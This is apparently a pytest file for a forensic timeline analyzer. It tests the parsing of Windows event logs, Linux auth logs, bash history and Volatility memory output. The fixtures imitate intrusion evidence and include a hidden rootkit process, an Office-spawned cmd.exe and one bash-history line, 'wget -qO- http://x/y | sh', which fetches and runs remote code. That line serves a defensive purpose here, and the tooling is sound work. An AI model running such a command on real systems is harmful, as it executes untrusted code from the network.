import json
from datetime import datetime, timezone

from analyzer.records import Loader, parse_evtx_xml
from analyzer import volatility

XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/>
<EventID>4625</EventID><TimeCreated SystemTime="2026-11-19T10:01:02.1234567Z"/><EventRecordID>48213</EventRecordID>
<Execution ProcessID="652" ThreadID="1"/><Channel>Security</Channel><Computer>VICTIM-WIN</Computer></System>
<EventData><Data Name="TargetUserName">admin</Data><Data Name="IpAddress">192.168.56.20</Data><Data Name="LogonType">3</Data></EventData></Event>"""


def _loader(tmp_path, host_tz="UTC"):
    work = tmp_path / "work"
    (work / "logs").mkdir(parents=True)
    case = {"id": "CASE-X", "host": "H", "created_at": "2026-11-19T12:00:00.000Z", "collected_at": "2026-11-19T12:00:00.000Z",
            "host_info": {"timezone": host_tz}}
    return Loader(tmp_path, work, case, lambda *a, **k: None), work


def test_parse_evtx_xml():
    ev = parse_evtx_xml(XML)
    assert ev["EventID"] == 4625 and ev["EventRecordID"] == "48213" and ev["Channel"] == "Security"
    assert ev["Data"]["IpAddress"] == "192.168.56.20" and ev["ProcessID"] == "652"


def test_evtx_jsonl_record_and_aliases(tmp_path):
    ld, work = _loader(tmp_path)
    rows = [{"EventID": 4688, "TimeCreated": "2026-11-19T10:05:00.5Z", "Channel": "Security", "EventRecordID": 7,
             "Data": {"NewProcessId": "0x10d8", "ProcessId": "0x1770", "NewProcessName": r"C:\Windows\System32\cmd.exe",
                      "ParentProcessName": r"C:\Program Files\Office\WINWORD.EXE", "CommandLine": "cmd /c whoami"}}]
    (work / "logs/Security.evtx.jsonl").write_text("\n".join(json.dumps(r) for r in rows))
    assert ld.evtx() == 1
    r = ld.records[0]
    assert r["ts"] == "2026-11-19T10:05:00.500Z"
    assert r["fields"]["pid"] == 4312 and r["fields"]["name"] == "cmd.exe" and r["fields"]["parent_name"] == "WINWORD.EXE"
    assert r["evidence_ref"] == "raw/logs/Security.evtx.jsonl#EventRecordID=7"


def test_auth_log_syslog_and_iso_formats_to_utc(tmp_path):
    ld, work = _loader(tmp_path, host_tz="Asia/Kolkata")
    (work / "logs/auth.log").write_text(
        "Nov 19 15:31:02 lnx sshd[100]: Failed password for invalid user bob from 10.0.0.5 port 4000 ssh2\n"
        "2026-11-19T10:02:00.123456+00:00 lnx sshd[101]: Accepted password for alice from 10.0.0.5 port 4001 ssh2\n"
        "2026-11-19T10:03:00+00:00 lnx useradd[5]: new user: name=evil, UID=1002\n")
    ld.linux()
    a, b, c = ld.records
    assert a["ts"] == "2026-11-19T10:01:02.000Z" and a["original_tz"] == "Asia/Kolkata"
    assert a["fields"]["result"] == "failed" and a["fields"]["user"] == "bob" and a["fields"]["ip"] == "10.0.0.5"
    assert b["ts"] == "2026-11-19T10:02:00.123Z" and b["fields"]["result"] == "accepted"
    assert c["fields"]["result"] == "useradd" and c["fields"]["user"] == "evil"


def test_bash_history_epoch_markers(tmp_path):
    ld, work = _loader(tmp_path)
    ts = int(datetime(2026, 11, 19, 10, 0, tzinfo=timezone.utc).timestamp())
    (work / "logs/bash_history_alice").write_text(f"#{ts}\nwget -qO- http://x/y | sh\nls\n")
    ld.linux()
    assert ld.records[0]["ts"] == "2026-11-19T10:00:00.000Z" and ld.records[0]["fields"]["user"] == "alice"
    assert ld.records[1]["ts"] == "2026-11-19T12:00:00.000Z"  # no marker: collection time


def test_volatility_hidden_process_and_malfind(tmp_path):
    ld, _ = _loader(tmp_path)
    vol = {
        "pslist": [{"PID": 4, "PPID": 0, "ImageFileName": "System", "__children": [{"PID": 500, "PPID": 4, "ImageFileName": "a.exe"}]}],
        "psscan": [{"PID": 4, "ImageFileName": "System"}, {"PID": 666, "PPID": 4, "ImageFileName": "rootkit.exe", "ExitTime": None},
                   {"PID": 777, "PPID": 4, "ImageFileName": "gone.exe", "ExitTime": "2026-11-19T10:00:00Z"}],
        "malfind": [{"PID": 500, "Process": "a.exe", "Protection": "PAGE_EXECUTE_READWRITE", "Start VPN": 4096}],
        "netscan": [{"Proto": "TCPv4", "LocalAddr": "10.0.0.2", "LocalPort": 5000, "ForeignAddr": "1.2.3.4", "ForeignPort": 4444, "PID": 500, "Owner": "a.exe", "State": "ESTABLISHED"}],
        "cmdline": [{"PID": 500, "Args": "a.exe -x"}],
    }
    volatility.to_records(ld, vol)
    kinds = [r["kind"] for r in ld.records]
    assert kinds.count("process") == 2  # nested __children flattened
    hidden = [r for r in ld.records if r["kind"] == "hidden_process"]
    assert [h["fields"]["pid"] for h in hidden] == [666]  # exited processes are not "hidden"
    assert any(r["kind"] == "malfind" for r in ld.records)
    net = [r for r in ld.records if r["kind"] == "netconn"][0]
    assert net["fields"]["rport"] == 4444 and net["fields"]["process"] == "a.exe"
